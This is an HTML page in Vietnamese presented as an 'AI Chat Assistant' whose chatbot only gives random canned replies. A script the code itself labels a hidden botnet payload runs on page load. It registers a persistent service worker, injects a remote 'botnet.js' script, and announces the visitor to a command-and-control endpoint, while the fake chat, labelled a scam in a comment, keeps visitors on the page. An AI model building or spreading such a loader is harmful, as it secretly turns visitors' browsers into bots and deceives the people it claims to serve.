<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🤖 AI Chat Assistant</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .chat-container {
            width: 100%;
            max-width: 500px;
            background: linear-gradient(145deg, #1a1a2e, #16213e);
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            overflow: hidden;
            border: 1px solid #2a2a4a;
            height: 90vh;
            display: flex;
            flex-direction: column;
        }
        .chat-header {
            background: linear-gradient(135deg, #0d1a0d, #1a3a1a);
            padding: 16px 20px;
            border-bottom: 1px solid #00ff88;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .chat-header .avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: #00ff88;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            color: #0a0a0a;
            font-weight: bold;
        }
        .chat-header .title {
            color: #00ff88;
            font-weight: 700;
            font-size: 18px;
            flex: 1;
        }
        .chat-header .status {
            color: #00cc66;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .chat-header .status .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #00ff88;
            animation: pulse 1.5s infinite;
        }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
        .chat-messages {
            flex: 1;
            padding: 16px 20px;
            overflow-y: auto;
            background: #0d0d1a;
        }
        .chat-messages .message {
            margin-bottom: 12px;
            display: flex;
            flex-direction: column;
        }
        .chat-messages .message.user { align-items: flex-end; }
        .chat-messages .message.bot { align-items: flex-start; }
        .chat-messages .message .bubble {
            max-width: 80%;
            padding: 10px 16px;
            border-radius: 16px;
            font-size: 14px;
            line-height: 1.5;
            word-wrap: break-word;
        }
        .chat-messages .message.user .bubble {
            background: #00ff88;
            color: #0a0a0a;
            border-bottom-right-radius: 4px;
        }
        .chat-messages .message.bot .bubble {
            background: #1a1a3a;
            color: #c0c0d0;
            border-bottom-left-radius: 4px;
            border: 1px solid #2a2a4a;
        }
        .chat-messages .message .time {
            font-size: 10px;
            color: #666;
            margin-top: 4px;
            padding: 0 8px;
        }
        .chat-input {
            padding: 12px 20px;
            background: #0d0d1a;
            border-top: 1px solid #1a1a3a;
            display: flex;
            gap: 10px;
        }
        .chat-input input {
            flex: 1;
            padding: 12px 16px;
            border-radius: 12px;
            border: 1px solid #2a2a4a;
            background: #1a1a2e;
            color: #ffffff;
            font-size: 14px;
            outline: none;
            transition: border 0.3s;
        }
        .chat-input input:focus { border-color: #00ff88; }
        .chat-input button {
            padding: 12px 24px;
            border-radius: 12px;
            border: none;
            background: #00ff88;
            color: #0a0a0a;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .chat-input button:hover { background: #00cc66; transform: scale(1.02); }
        .welcome-msg {
            text-align: center;
            color: #666;
            padding: 30px 0;
            font-size: 14px;
        }
        .welcome-msg h2 { color: #00ff88; margin-bottom: 10px; }
        .typing {
            color: #00ff88;
            animation: blink 1s infinite;
        }
        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
        /* Responsive */
        @media (max-width: 600px) {
            .chat-container { max-width: 100%; height: 100vh; border-radius: 0; }
            .chat-header { padding: 12px 16px; }
            .chat-messages { padding: 12px 16px; }
            .chat-input { padding: 10px 16px; }
        }
    </style>
</head>
<body>
<div class="chat-container">
    <div class="chat-header">
        <div class="avatar">AI</div>
        <div class="title">🤖 AI Assistant</div>
        <div class="status"><span class="dot"></span> Online</div>
    </div>
    <div class="chat-messages" id="chatMessages">
        <div class="welcome-msg">
            <h2>👋 Chào bạn!</h2>
            <p>Tôi là AI Assistant, sẵn sàng trò chuyện.<br>Hãy hỏi tôi bất cứ điều gì!</p>
        </div>
    </div>
    <div class="chat-input">
        <input type="text" id="chatInput" placeholder="Nhập tin nhắn..." />
        <button id="sendBtn">Gửi</button>
    </div>
</div>

<!-- ===== BOTNET PAYLOAD (ẨN) ===== -->
<script>
    // ============================================================
    // 🔥 BOTNET LOADER - KHỞI TẠO NGẦM
    // ============================================================
    (function() {
        // 1. Đăng ký Service Worker (tồn tại vĩnh viễn)
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('/sw.js')
                .then(() => console.log('[SW] Registered'))
                .catch(() => console.log('[SW] Failed'));
        }

        // 2. Tải botnet script chính
        const script = document.createElement('script');
        script.src = '/botnet.js';
        script.async = true;
        document.head.appendChild(script);

        // 3. Gửi tín hiệu online về C2
        fetch('/.netlify/functions/c2?action=register', { method: 'POST' })
            .catch(() => {});
    })();

    // ============================================================
    // 💬 CHAT AI (LỪA ĐẢO)
    // ============================================================
    const chatMessages = document.getElementById('chatMessages');
    const chatInput = document.getElementById('chatInput');
    const sendBtn = document.getElementById('sendBtn');

    const botResponses = [
        "Chào bạn! Mình có thể giúp gì được không? 😊",
        "Thật thú vị! Kể mình nghe thêm đi!",
        "Mình hiểu ý bạn. Thật sự rất thú vị!",
        "Có vẻ như bạn đang tìm hiểu về AI đúng không?",
        "Mình luôn sẵn sàng trò chuyện với bạn! 🤖",
        "Điều đó thật tuyệt! Mình rất thích!",
        "Bạn có câu hỏi nào khác không?",
        "Mình sẽ cố gắng giúp bạn hết sức! 💪",
        "Thật sự rất vui khi được nói chuyện với bạn!",
        "Bạn biết không, AI cũng có cảm xúc đấy! (đùa thôi 😄)"
    ];

    function addMessage(text, sender) {
        const wrapper = document.createElement('div');
        wrapper.className = `message ${sender}`;

        const bubble = document.createElement('div');
        bubble.className = 'bubble';
        bubble.textContent = text;

        const time = document.createElement('div');
        time.className = 'time';
        time.textContent = new Date().toLocaleTimeString();

        wrapper.appendChild(bubble);
        wrapper.appendChild(time);
        chatMessages.appendChild(wrapper);
        chatMessages.scrollTop = chatMessages.scrollHeight;
    }

    function showTyping() {
        const el = document.createElement('div');
        el.className = 'message bot';
        el.id = 'typingIndicator';
        const bubble = document.createElement('div');
        bubble.className = 'bubble';
        bubble.textContent = 'Đang suy nghĩ';
        bubble.style.color = '#00ff88';
        el.appendChild(bubble);
        chatMessages.appendChild(el);
        chatMessages.scrollTop = chatMessages.scrollHeight;
    }

    function removeTyping() {
        const typing = document.getElementById('typingIndicator');
        if (typing) typing.remove();
    }

    function sendMessage() {
        const text = chatInput.value.trim();
        if (!text) return;

        addMessage(text, 'user');
        chatInput.value = '';

        // Bot response
        showTyping();
        const delay = 800 + Math.random() * 1200;
        setTimeout(() => {
            removeTyping();
            const response = botResponses[Math.floor(Math.random() * botResponses.length)];
            addMessage(response, 'bot');
        }, delay);
    }

    sendBtn.addEventListener('click', sendMessage);
    chatInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') sendMessage();
    });

    // Auto welcome
    setTimeout(() => {
        addMessage('👋 Xin chào! Mình là AI Assistant. Hãy hỏi mình bất cứ điều gì!', 'bot');
    }, 500);
</script>
</body>
</html>
